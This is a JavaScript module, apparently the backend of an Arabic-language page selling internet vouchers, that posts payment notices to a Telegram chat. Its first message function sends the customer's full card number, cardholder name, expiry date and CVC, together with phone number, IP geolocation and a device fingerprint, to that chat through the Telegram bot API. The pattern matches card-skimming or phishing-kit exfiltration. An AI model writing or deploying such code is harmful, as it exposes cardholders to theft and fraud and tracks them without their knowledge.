const axios = require("axios");
const FormData = require("form-data");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

/**
 * جلب بيانات الشبكة والموقع بناءً على IP
 */
async function fetchNetworkDetailsByIP(ip) {
  const result = {
    location: "غير معروف",
    isp: "غير معروف"
  };

  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
    return null;
  }

  const cleanIp = String(ip).split(",")[0].trim();

  try {
    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
    if (res.data) {
      const city = res.data.city || "غير معروفة";
      const country = res.data.country_name || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = res.data.org || res.data.asn || "غير معروف";
      return result;
    }
  } catch (e) {
    try {
      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org`, { timeout: 3000 });
      if (fallbackRes.data && fallbackRes.data.status === "success") {
        const city = fallbackRes.data.city || "غير معروفة";
        const country = fallbackRes.data.country || "غير معروفة";
        result.location = `${city}، ${country}`;
        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
        return result;
      }
    } catch (fallbackErr) {
      console.warn("⚠️ تعذر جلب تفاصيل الموقع والشبكة للـ IP:", cleanIp);
    }
  }

  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card") method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

/**
 * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام
 */
async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";

    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
      return;
    }

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents
      ? (data.amount_cents / 100).toFixed(2)
      : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";
    const userPhone = data.phone || 
                        data.billing_data?.phone_number || 
                        data.customer?.phone_number || 
                        "غير محدد";

    let message = "";

    if (isInitial) {
      const clientID = data.clientID || data.clientId || "غير متوفر";

      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
      let ispText = data.ispProvider || data.isp || null;

      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
        const netInfo = await fetchNetworkDetailsByIP(publicIP);
        if (netInfo) {
          if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
        }
      }

      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
      const deviceRAM = data.deviceRAM || "غير متوفر";
      const cpuCores = data.cpuCores || "غير متوفر";
      const deviceType = data.deviceType || "غير متوفر";
      const screenSize = data.screenSize || "غير متوفر";
      const userTimeZone = data.userTimeZone || "غير متوفر";
      const lang = data.lang || "غير متوفر";

      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (userPhone && userPhone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
      }

      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                 `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
                 `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
                 `----------------------------------------\n` +
                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;

    } else {
      const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";

      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
                `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
                `----------------------------------------\n` +
                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
    }

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
  }
}

/**
 * 2. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام
 */
async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
      return;
    }

    if (!imageBuffer) {
      console.error("❌ [Telegram Error] Buffer الصورة فارغ!");
      return;
    }

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    
    form.append("photo", imageBuffer, {
      filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
      contentType: "image/png"
    });

    const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                    `🏢 الفرع: <b>${paymentDetails.branchName || 'حكايات نت رئيسي'}</b>\n` +
                    `📦 الباقة: <b>${paymentDetails.packageName || 'باقة إنترنت'}</b>\n` +
                    `💰 المبلغ: <b>${paymentDetails.amount} جنيه</b>\n` +
                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                    `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
                    `🆔 رقم العملية: <code>${paymentDetails.transactionId || 'غير متوفر'}</code>`;

    form.append("caption", caption);
    form.append("parse_mode", "HTML");

    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: { ...form.getHeaders() },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

    if (response.data && response.data.ok) {
      console.log(`📸 [Telegram Image SUCCESS] تم إرسال صورة الكارت بنجاح للمعاملة: ${paymentDetails.transactionId}`);
    }

  } catch (err) {
    console.error("❌ [Telegram Image Error Details]:", err.response?.data || err.message);
  }
}

/**
 * 3. 💬 إرسال رسائل وسائط شات الدعم المباشر من العميل للتليجرام
 */
async function sendSupportChatMessage({ text, file, txId, reply_markup }) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
      return;
    }

    const defaultReplyMarkup = reply_markup || {
      inline_keyboard: [
        [
          {
            text: "💬 رد على العميل",
            callback_data: `reply_${txId || "GUEST"}`
          }
        ]
      ]
    };

    if (file) {
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("photo", file.buffer, {
        filename: file.originalname || "user_upload.png",
        contentType: file.mimetype || "image/png"
      });
      const caption = `💬 <b>رسالة دعم عميل (مرفق)</b>\n🆔 المعرف: <code>${txId || 'عام'}</code>\n📝 النص المُرفق: ${text || 'بدون نص'}`;
      form.append("caption", caption);
      form.append("parse_mode", "HTML");
      form.append("reply_markup", JSON.stringify(defaultReplyMarkup));

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: { ...form.getHeaders() }
      });
    } else if (text) {
      const message = `💬 <b>رسالة دعم جديدة من العميل:</b>\n🆔 المعرف: <code>${txId || 'عام'}</code>\n\n📝 الرسالة:\n${text}`;
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
        reply_markup: defaultReplyMarkup
      });
    }
  } catch (err) {
    console.error("❌ [Support Chat Telegram Error]:", err.response?.data || err.message);
  }
}

/**
 * 4. 🔄 معالج الويب هوك مع دعم البث المباشر (WebSocket / Socket.io)
 * @param {object} req - طلب HTTP
 * @param {object} res - استجابة HTTP
 * @param {object} io - (اختياري) كائن Socket.io الخاص بالخادم لتوصيل الرسالة المباشرة
 */
async function handleTelegramWebhook(req, res, io = null) {
  try {
    const update = req.body;

    // 1. التعامل مع ضغطة زر "💬 رد على العميل"
    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const adminChatId = update.callback_query.message.chat.id;

      if (callbackData && callbackData.startsWith("reply_")) {
        const targetClientId = callbackData.replace("reply_", "");

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          callback_query_id: update.callback_query.id
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: adminChatId,
          text: `✏️ اكتب ردك الآن للعميل صاحب المعرف:\n\`${targetClientId}\`\n\n*(تأكد من عمل Reply على هذه الرسالة أثناء الكتابة)*`,
          parse_mode: "Markdown",
          reply_markup: {
            force_reply: true
          }
        });
      }
      return res.sendStatus(200);
    }

    // 2. التعامل مع رسالة الرد المكتوبة من الأدمن
    if (update.message && update.message.reply_to_message) {
      const replyText = update.message.text || "";
      const originalText = update.message.reply_to_message.text || update.message.reply_to_message.caption || "";

      // استخراج targetClientId بين العلامتين ``
      const match = originalText.match(/`([^`]+)`/);
      if (match && match[1]) {
        const targetClientId = match[1];

        console.log(`📩 [LIVE CHAT REPLY] الرد الموجه للعميل [${targetClientId}]: ${replyText}`);

        // 📡 إرسال الرد فوراً عبر البث المباشر WebSocket إن وجد
        if (io) {
          io.to(targetClientId).emit("support_reply", {
            sender: "support",
            text: replyText,
            timestamp: new Date().toISOString()
          });
        }

        // تأكيد إرسال الرد في شات التليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: update.message.chat.id,
          text: `✅ تم تسليم الرد بنجاح عبر البث المباشر للعميل (\`${targetClientId}\`)`,
          parse_mode: "Markdown"
        });
      }
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error("❌ [Telegram Webhook Error]:", err.response?.data || err.message);
    return res.sendStatus(500);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage,
  sendSupportChatMessage,
  handleTelegramWebhook
};
